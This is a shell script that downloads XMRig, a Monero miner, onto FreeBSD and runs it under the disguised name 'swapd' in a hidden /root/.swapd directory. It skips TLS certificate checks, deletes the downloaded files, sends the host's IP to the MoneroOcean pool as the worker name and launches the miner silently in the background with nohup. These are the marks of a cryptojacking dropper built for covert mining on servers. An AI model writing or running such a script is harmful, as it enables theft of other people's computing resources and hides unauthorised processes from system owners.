#!/bin/sh
# Minimal XMRig installer for FreeBSD (static binary)
# Usage: sh install.sh YOUR_WALLET_ADDRESS

if [ -z "$1" ]; then
    echo "Usage: $0 WALLET_ADDRESS"
    exit 1
fi

WALLET="$1"
WORKDIR="/root/.swapd"
mkdir -p "$WORKDIR" || exit 1
cd "$WORKDIR" || exit 1

# Use the latest static FreeBSD build (v6.26.0)
URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-freebsd-static-x64.tar.gz"
echo "Downloading $URL ..."

# Try fetch (native FreeBSD), fallback to curl, then wget
fetch -o xmrig.tar.gz "$URL" 2>/dev/null || \
curl -L -k -o xmrig.tar.gz "$URL" 2>/dev/null || \
wget --no-check-certificate -O xmrig.tar.gz "$URL" 2>/dev/null

if [ ! -f xmrig.tar.gz ]; then
    echo "Download failed"
    exit 1
fi

# Extract and find the binary (it's inside a subdirectory)
tar -xzf xmrig.tar.gz

# Look for xmrig binary anywhere in the extracted files
BINARY=$(find . -type f -name "xmrig" -perm -111 2>/dev/null | head -1)

if [ -z "$BINARY" ] || [ ! -f "$BINARY" ]; then
    echo "Binary not found in tarball"
    echo "Contents of current directory:"
    ls -la
    exit 1
fi

# Move binary to swapd
mv "$BINARY" swapd
chmod +x swapd
rm -f xmrig.tar.gz

# Clean up any remaining extracted files/directories
find . -type d -name "xmrig-*" -exec rm -rf {} + 2>/dev/null || true

# Detect IP for worker pass (simple fallback)
PASS=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
[ -z "$PASS" ] && PASS="worker"

# Create config.json (MoneroOcean pool)
cat > config.json << EOF
{
    "autosave": false,
    "donate-level": 0,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "gulf.moneroocean.stream:80",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

# Start miner in background
nohup ./swapd -c config.json > /dev/null 2>&1 &
echo "Miner started with wallet: $WALLET (worker: $PASS)"
